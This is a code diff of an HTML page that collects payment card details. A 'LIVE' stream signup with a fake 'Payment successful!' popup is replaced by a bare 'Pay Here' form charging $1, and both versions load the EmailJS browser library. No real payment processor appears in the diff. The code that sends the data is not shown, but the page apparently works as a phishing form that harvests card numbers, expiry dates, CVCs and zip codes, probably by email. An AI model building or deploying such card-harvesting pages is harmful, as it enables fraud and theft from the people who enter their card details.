@@ -7,34 +7,17 @@
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+
   <div class="container">
-    <h1>LIVE</h1>
-    <h2>To access this live, please select one of the options to sign up.</h2>
-    <div class="buttons">
-      <button id="oneWeekButton">One week free trail</button>
-      <button id="oneMonthButton">$7/month</button>
-    </div>
-
-    <div id="cardDiv">
-      <h3 id="selectedOption"></h3>
-      <form id="cardForm">
-        <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" required><br>
-
-        <div class="inline-inputs">
-          <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required>
-          <input type="text" id="cvc" name="cvc" placeholder="CVC" required>
-          <input type="text" id="zipCode" name="zipCode" placeholder="Zip Code" required>
-        </div>
-
-        <button type="button" id="sendButton">Join Now</button>
-      </form>
-    </div>
-  </div>
-
-  <div id="overlay"></div>
-  <div id="popup">
-    <p>Payment successful!</p>
-    <button id="popupClose">OK</button>
+    <h2>Pay Here</h2>
+    <form id="paymentForm">
+      <input type="text" id="cardNumber" placeholder="Card Number" required>
+      <input type="text" id="expDate" placeholder="MM/YY" required>
+      <input type="text" id="cvc" placeholder="CVC" required>
+      <input type="text" id="zipCode" placeholder="Zip Code" required>
+      <p id="errorMessage" class="error"></p>
+      <button type="button" id="payButton">Pay $1</button>
+    </form>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
